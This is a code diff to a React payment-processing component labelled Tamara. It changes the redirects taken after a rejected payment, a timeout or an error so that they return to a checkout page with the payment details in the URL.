@@ -86,22 +86,22 @@ const TamaraPaymentProcessing = () => {
             setTimeout(() => {
               navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${paymentId}`);
             }, 2000);
-          } else if (statusData.payment_status === "rejected") {
+           } else if (statusData.payment_status === "rejected") {
             clearInterval(pollInterval);
             setPaymentStatus("failed");
             setTimeout(() => {
-              navigate(-1); // Go back to payment form
+              // إعادة التوجيه إلى صفحة البطاقة مع مسح البيانات القديمة
+              navigate(`/tamara-checkout?paymentId=${paymentId}&price=${totalAmount}&company=${encodeURIComponent(company)}`, { replace: true });
             }, 3000);
           }
         }, 2000);
 
-        // Timeout after 30 seconds
         setTimeout(() => {
           clearInterval(pollInterval);
           if (paymentStatus === "processing") {
             setPaymentStatus("failed");
             setTimeout(() => {
-              navigate(-1);
+              navigate(`/tamara-checkout?paymentId=${paymentId}&price=${totalAmount}&company=${encodeURIComponent(company)}`, { replace: true });
             }, 3000);
           }
         }, 30000);
@@ -110,7 +110,7 @@ const TamaraPaymentProcessing = () => {
         console.error("Payment submission error:", error);
         setPaymentStatus("failed");
         setTimeout(() => {
-          navigate(-1);
+          navigate(`/tamara-checkout?paymentId=${paymentId}&price=${totalAmount}&company=${encodeURIComponent(company)}`, { replace: true });
         }, 3000);
       }
     };
